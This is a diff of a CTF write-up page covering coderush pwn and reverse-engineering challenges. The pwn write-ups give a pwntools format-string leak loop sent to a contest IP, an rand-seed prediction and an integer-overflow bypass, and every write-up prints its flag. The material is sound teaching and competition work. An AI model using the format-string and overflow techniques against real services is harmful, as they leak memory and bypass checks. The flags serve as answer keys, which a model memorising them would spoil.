@@ -3,15 +3,248 @@ comments: true
 authors:
   - gr007
 tags:
-  - rev
   - coderush
+  - pwn
+  - rev
+  - format string vulnerability
+  - integer overflow
+---
+
+# format_string ftw
+
+## Description
+
+No one should see what I have in stack! Its only mine!
+
+`nc 139.59.0.163 7777`
+
+>Author: `peace_ranger`
+
+## Solution
+
+We are only given a connection information. we can connect to this via netcat. as this is a black box challenge where the clues are given in the challenge name and description, nothing else need to be said. The following exploit should work just fine:
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+
+for i in range(1,200):
+    p = remote("139.59.0.163",7777)
+    x = f'%{i}$s'
+    p.recvline()
+    p.sendline(bytes(x,"UTF-8"))
+    print(p.recvline())
+
+```
+
+---
+
+# Seed
+
+## Description
+
+Let's play a game where I guess a number and you tell what it is.
+If you can correctly tell me what my guess is I will give you my precious flag.
+
+`nc 139.59.0.163 5336`
+
+**flag format:** `coderush{fl4g}`
+
+>Author: `gr007`
+
+[seed](./pwn/seed/seed)
+
+## Solution
+
+We are given a binary seed file. Let's load it up with Ghidra.
+
+??? Decompiled source
+    ```c
+    int main(void)
+    {
+        uint __seed;
+        int r;
+        long in_FS_OFFSET;
+        int input;
+        int i;
+        FILE *file;
+        char flag [72];
+        long local_10;
+
+        local_10 = *(in_FS_OFFSET + 40);
+        __seed = rand();
+        srand(__seed);
+        puts("How many seeds do i have?");
+        for (i = 0; i < 100; i += 1) {
+            __isoc99_scanf(&PTR_DAT_00102022,&input);
+            r = rand();
+            if (r % 100000 != input) {
+                puts(&PTR_DAT_00102022 + 3);
+                        /* WARNING: Subroutine does not return */
+                exit(0);
+            }
+            puts("You must be lucky");
+        }
+        file = fopen("flag.txt","r");
+        if (file == NULL) {
+            puts("flag not found.");
+            puts("If you are running this on the remote server, contact the admin immediately.");
+            puts(
+                "If you are running this on your local machine, create a flag.txt with a dummy flag for  debugging purpose."
+                );
+            fflush(stdout);
+                        /* WARNING: Subroutine does not return */
+            exit(0);
+        }
+        fgets(flag,59,file);
+        printf("It cannot be!\n(;_;)\nMy precious flag: %s\n",flag);
+        if (local_10 != *(in_FS_OFFSET + 40)) {
+                        /* WARNING: Subroutine does not return */
+            __stack_chk_fail();
+        }
+        return 0;
+    }
+    ```
+
+So, What we need to do is match with the server and output the same random number that the server generates. This is pretty easy. We just need to know one basic thing that the sequence of random numbers depends on the seed that is given to the random number generator. The c random number generator always defaults to some seed for which the random number that it starts with is always the same no matter the hardware or software. Thus, the first random number is always the same. If that number is used as seed, we get the same sequence. let us generate the same sequence by re-producing the main function in [`sol.c`](./pwn/seed/sol.c).
+
+![generate_seed](./pwn/seed/gen_seed.png)
+
+![voila](./pwn/seed/voila.png)
+
+flag: `coderush{t0d@y_@_533d_70m0rr0w_@7r33}`
+
+---
+
+# Three Sum
+
+## Description
+
+I hope ye'all have done [this](https://play.picoctf.org/events/72/challenges/challenge/382) challenge where you sum up two numbers. But don't you think that `three` makes a lot more sense than `two`? We will make things right by adding up three numbers to make it awe sum.
+
+Access the server with: `nc 139.59.0.163 3555`
+
+**flag format:** `coderush{fl4g}`
+
+>Author: `gr007`
+
+[chal](./pwn/three_sum/chal)
+
+## Solution
+
+We are given a binary. Let's load it into Ghidra.
+
+??? Decompiled source
+    ```c
+    int overflew(int sum,int n1,int n2,int n3){
+        int r;
+
+        if ((((n1 < 1) || (n2 < 1)) || (n3 < 1)) || (0 < sum)) {
+            r = 0;
+        }
+        else {
+            r = 1;
+        }
+        return r;
+    }
+
+    int main(void){
+        int s;
+        long in_FS_OFFSET;
+        uint n1;
+        uint n2;
+        uint n3;
+        int sum;
+        FILE *file;
+        char flag [72];
+        long local_10;
+
+        local_10 = *(in_FS_OFFSET + 40);
+        puts("n1 > n1 + n2 + n3 AND n2 > n1 + n2 + n3 AND n3 > n1 + n2 + n3");
+        fflush(stdout);
+        puts("What three positive numbers can make this possible: ");
+        fflush(stdout);
+        s = __isoc99_scanf(&DAT_0010207d,&n1);
+        if (s != 0) {
+            s = __isoc99_scanf(&DAT_0010207d,&n2);
+            if (s != 0) {
+                s = __isoc99_scanf(&DAT_0010207d,&n3);
+                if (s != 0) {
+                    printf("You entered %d, %d and %d\n",n1,n2,n3);
+                    fflush(stdout);
+                    sum = n3 + n1 + n2;
+                    s = overflew(sum,n1,n2,n3);
+                    if (s != 0) {
+                        puts("You have an integer overflow.");
+                        fflush(stdout);
+                        /* WARNING: Subroutine does not return */
+                        exit(0);
+                    }
+                    puts("Is there no overflow?");
+                    puts("OR is the cpu trippin?");
+                    fflush(stdout);
+                    if ((((sum < n1) && (sum < n2)) && (sum < n3)) &&
+                    (((0 < n1 && (0 < n2)) && (0 < n3)))) {
+                        file = fopen("flag.txt","r");
+                        if (file == NULL) {
+                            puts("flag not found.");
+                            puts(
+                                "If you are running this on the remote server, contact the admin immedia tely."
+                                );
+                            puts(
+                                "If you are running this on your local machine, create a flag.txt with a  dummy flag for debugging purpose."
+                                );
+                            fflush(stdout);
+                        /* WARNING: Subroutine does not return */
+                            exit(0);
+                        }
+                        fgets(flag,59,file);
+                        printf("YOUR FLAG IS: %s\n",flag);
+                        fflush(stdout);
+                        /* WARNING: Subroutine does not return */
+                        exit(0);
+                    }
+                    puts("Then again, where is the flag?");
+                }
+            }
+        }
+        if (local_10 != *(in_FS_OFFSET + 40)) {
+                        /* WARNING: Subroutine does not return */
+            __stack_chk_fail();
+        }
+        return 0;
+    }
+    ```
+
+
+The program does nothing out of ordinary. It takes Three integers as input, adds them up and checks if the result has caused any overflow or not with the `overflew` function. The way it checks for overflow is by the following condition: `(((n1 < 1) || (n2 < 1)) || (n3 < 1)) || (0 < sum)`. So, by this function, overflow occurs if either the sum is less than 0 or any one of the numbers is less than 1. By sane logic it might be hard to get that how can you add three poisitive integers greater than 0 but still get a sum greater than zero that is somehow less than any one of the integers that were added. But if we talk about computers, `meh`.
+
+Integers are 32 bit long. if the result is to be greater than zero then the `sign` bit needs to be zero in the result. Now, how can we do it?
+Let's look at the following example for 8 bit signed integer:
+
+`0b01100000` => `n1`
+
+`0b01100000` => `n2`
+
+`0b01000000` => `n3`
+
+`0b00000000` => `sum`
+
+how this happens? well the original result would be: `0b100000000` in `9` bit. But the extra 1 has to be removed. Now, we are left with only 0 as sum. Thus having sum less than any of the given numbers. The same logic applies for 32bit integers. So, to get 0 as sum, we need any three positive numbers whose sum add up to at least `2<<32 + 1` as the sum needs to be greater than zero.
+
+![voila](./pwn/three_sum/voila.png)
+
+flag: `coderush{1_5um_2_5um_3_5um_@we_5um}`
+
 ---
 
 # Chocolate Cake
 
 ## Description
 
-I found the best [recipe](recipe) for Cake in the world. But this recipe needs a secret ingredient which I don't
+I found the best [recipe](./rev/Cake/recipe) for Cake in the world. But this recipe needs a secret ingredient which I don't
 know. Help me discover the hidden secrets of this recipe and I will make the best cake for you.
 
 You can access the kitchen with `nc 139.59.0.163 1740`
@@ -25,9 +258,8 @@ You can access the kitchen with `nc 139.59.0.163 1740`
 The recipe wants a secret ingredient when executed. Let's see what we can see in Ghidra.
 I have done some light renaming and so on. now let's try to recreate the recipe. It's pretty amazing how much similar the decompiled source is compared to the actual source code.
 
-### Ghidra black magic
 
-??? recipe_from_ghidra
+??? Decompiled source
     ```c
     byte taste_cake(char *cake)
 
@@ -330,7 +562,7 @@ Now, seeing 26 as the constant, we can assume that the output of `secret_igredie
 
 I wanted to see what happens to the characters after this whole transformation of `prepare` function. Look what I found:
 
-![rot13](prep.png)
+![rot13](./rev/Cake/prep.png)
 
 The function does `rot13` on each characters. so, another simple rot13 would bring back the input from the output.
 Now, it's time to write `wait` function as designed by cake_a_bake function:
@@ -534,11 +766,11 @@ void preserve(char* secret_ingredient){
 
 Now, we have all the required to retrieve the secret_ingredient from the cake. the following c file computes the secret_ingredient from the cake.
 
-[secret](secret.c)
+[secret](./rev/Cake/secret.c)
 
 Now, we hit a wall of disappointment.
 
-![disappointment](disappointment.png)
+![disappointment](./rev/Cake/disappointment.png)
 
 We can assume that we messed up somewhere bigtime. But upon further observation of the reversal code, everything seems to be okay. But there is a catch. all the letters in the input are rotated whether they are between `a` and `z` or not. My guess is that there were some characters in the secret_ingredient that were not in the range `a~z` so, rot13 becomes reversible for only those who were between `a~z` and irreversible for those who were not. Now, we change the secret code a little in our recipe, we do the following:
 ```c
@@ -565,6 +797,267 @@ When we put `134570!@_` in wait, we get the following output: `XZ[\^WHMl`; Now, 
 
 Annd voila we got our flag:
 
-![voila](voila.png)
+![voila](./rev/Cake/voila.png)
 
 flag: `coderush{7h3_c@k3_w@5_5up3r_d3l15h}`
+
+---
+
+# Nest
+
+## Description
+
+Winter fades, spring awakes,
+The cuckoo sings, the earth shakes,
+Summer's near, but first a rest,
+A nest to build, with utmost zest.
+
+<img src="./rev/Nest/cuckoos_nest.png"  width="400"  height="400" alt="cuckoo_nest">
+
+**flag format:** `coderush{fl4g}`
+
+>Author: `gr007`
+
+[nest](./rev/Nest/nest)
+
+## Solution
+
+We are given a binary ELF x64 executable. it asks for an input. presumably for the flag.
+after opening the file in ghidra and renaming a couple of variables, we get the following c like source code:
+??? Decompiled Source
+    ```c
+
+    /* DISPLAY WARNING: Type casts are NOT being printed */
+
+    undefined8 main(void)
+
+    {
+        char c;
+        long in_FS_OFFSET;
+        int i;
+        char flag [40];
+        long local_10;
+
+        local_10 = *(in_FS_OFFSET + 40);
+        read(1,flag,37);
+        for (i = 0; i < 37; i += 1) {
+            if (flag[i] == '\n') {
+                c = '\0';
+            }
+            else {
+                c = flag[i];
+            }
+            flag[i] = c;
+        }
+        if (flag[36] == '}' &&
+            (flag[6] == 's' &&
+            (flag[25] == '5' &&
+            (flag[2] == 'd' &&
+            (flag[27] == '1' &&
+            (flag[0] == 'c' &&
+            (flag[21] == 'c' &&
+            (flag[17] == 'n' &&
+            (flag[4] == 'r' &&
+            (flag[29] == '_' &&
+            (flag[20] == '_' &&
+            (flag[13] == '0' &&
+            (flag[32] == 'r' &&
+            (flag[11] == 'c' &&
+            (flag[3] == 'e' &&
+            (flag[30] == '5' &&
+            (flag[26] == '_' &&
+            (flag[15] == '_' &&
+            (flag[8] == '{' &&
+            (flag[35] == 'g' &&
+            (flag[28] == 'n' &&
+            (flag[16] == '0' &&
+            (flag[18] == 'l' &&
+            (flag[24] == '3' &&
+            (flag[22] == '0' &&
+            (flag[23] == 'm' &&
+            (flag[31] == 'p' &&
+            (flag[14] == '0' &&
+            (flag[1] == 'o' &&
+            (flag[33] == '1' &&
+            (flag[12] == 'k' &&
+            (flag[10] == 'u' &&
+            (flag[5] == 'u' &&
+            (flag[7] == 'h' && (flag[9] == 'c' && (flag[34] == 'n' && flag[19] == 'y')))))))))))))))))))
+            ))))))))))))))))) {
+            puts("Yes! That\'s the saying.");
+        }
+        else {
+            puts("No, that\'s not the saying.");
+        }
+        if (local_10 != *(in_FS_OFFSET + 40)) {
+                        /* WARNING: Subroutine does not return */
+            __stack_chk_fail();
+        }
+        return 0;
+    }
+
+
+    ```
+
+So, from the source code, it is obvious that the flags characters are being checked without order. we bring it in order
+or just write the following c code to get the flag:
+```c
+int main(){
+    char flag [41];
+    flag[36] = '}';
+    flag[6] = 's';
+    flag[25] = '5';
+    flag[2] = 'd';
+    flag[27] = '1';
+    flag[0] = 'c';
+    flag[21] = 'c';
+    flag[17] = 'n';
+    flag[4] = 'r';
+    flag[29] = '_';
+    flag[20] = '_';
+    flag[13] = '0';
+    flag[32] = 'r';
+    flag[11] = 'c';
+    flag[3] = 'e';
+    flag[30] = '5';
+    flag[26] = '_';
+    flag[15] = '_';
+    flag[8] = '{';
+    flag[35] = 'g';
+    flag[28] = 'n';
+    flag[16] = '0';
+    flag[18] = 'l';
+    flag[24] = '3';
+    flag[22] = '0';
+    flag[23] = 'm';
+    flag[31] = 'p';
+    flag[14] = '0';
+    flag[1] = 'o';
+    flag[33] = '1';
+    flag[12] = 'k';
+    flag[10] = 'u';
+    flag[5] = 'u';
+    flag[7] = 'h';
+    flag[9] = 'c';
+    flag[34] = 'n';
+    flag[19] = 'y';
+    puts(flag);
+    return 0;
+}
+
+```
+
+flag : `coderush{cuck00_0nly_c0m35_1n_5pr1ng}`
+
+---
+
+# Keasy
+
+## Description
+
+I am a fan of random numbers.
+I encrypted the flag with a random key.
+I then threw the key into the `/dev/null` blackhole.
+Now I can't retrieve the flag.
+But I heard your team specializes in retrieving keys from there.
+
+Like Napoleon Once said:
+`Give me the key. I shall give you the flag.`
+
+This [file](./rev/keasy/keasy) has the encrypted flag in it. You can also use this file to decrypt the flag.
+
+**flag format:** `coderush{fl4g}`
+
+>Author: `gr007`
+
+### Hint
+
+The key does not necessarily have to be comprised of printable ascii characters.
+
+## Solution
+
+Let's use ghidra to look at the decompiled source.
+
+![main_gh](./rev/keasy/main_gh.png)
+
+![decrypt_gh](./rev/keasy/decrypt_gh.png)
+
+We can see that the encryption or decryption in place is simple xor cicle. Now the tricky part is there is no clue given as to what we need to xor with to get the original flag or the key. As if one can be obtained, the other unknown can be obtained by simply xoring them.
+```c
+x ^ y = z
+z ^ x = y
+y ^ z = x
+```
+But we have another clue in the shadows though. The flag format is `coderush{flag}` we can see that the first 8
+characters of the flag will be `coderush`. And also the key is also 8 chars long. So, the first 8 bytes of the encrypted
+flag i.e, `0x271056073f596139` can be xored with 'coderush' to get the key and we can then pass the key to the program
+who will give us the full flag.
+
+The following c [program](./rev/keasy/sol.c) will find out the key:
+
+```c
+#include <stdio.h>
+
+void solve(char* a, char* b, int len) {
+    for (int i = 0; i < len; i++) {
+        printf("%c",a[i]^b[i]);
+    }
+}
+
+int main() {
+    long bytes = 0x271056073f596139;
+    char known[] = "coderush";
+    solve(&bytes,known,8);
+}
+```
+After compiling the program, we run the program and pipe the output to keasy.
+```bash
+./sol | ./keasy
+```
+flag: `coderush{ru5h_0f_n@p0l30n}`
+
+---
+
+# Matrix
+
+## Description
+
+Matrix is inevitable. Escape the `Matrix`.
+
+>Author: `gr007`
+
+[matrix](./rev/matrix/matrix)
+
+## Solution
+
+We are given the `matrix` binary that asks for the one last thing that we have to say. Presumably that has to be the
+flag in order to escape the matrix.
+We open the binary in ghidra and look at what the source code looks like:
+
+The following part of code is interesting. Because this part is our goal:
+```c
+    f = true;
+    for (j = 0; j < 40; j += 1) {
+        sum = 0;
+        for (k = 0; k < 32; k += 1) {
+            sum += flag[k] * matrix[k + j * 32];
+        }
+        f = f & sum == B[j];
+    }
+    if (f) {
+        puts("You sure can escape the matrix");
+    }
+    else {
+        puts("You shall never escape the matrix");
+    }
+```
+
+So, what is happening is that the flag that is input is being taken as if it were `X` in a matrix multiplication
+equation for `AX = B`. We have `B` matrix with which the result is being compared with. and also the A matrix with which
+our flag is being multiplied with. Now, we can simply do `X = A^(-1)*B` to get X. But there are only 32 characters in
+the flag but 40 values in `B` and the matrix `A` is `40x32`. We can simply opt out any 8 row from both `A` and `B` and
+get the flag in 32 characters.
+The following python file calculates the flag:
+[`sol.py`](./rev/matrix/sol.py)
+
+flag: `coderush{s0_d0_y0u_l1k3_m4tr1x?}`
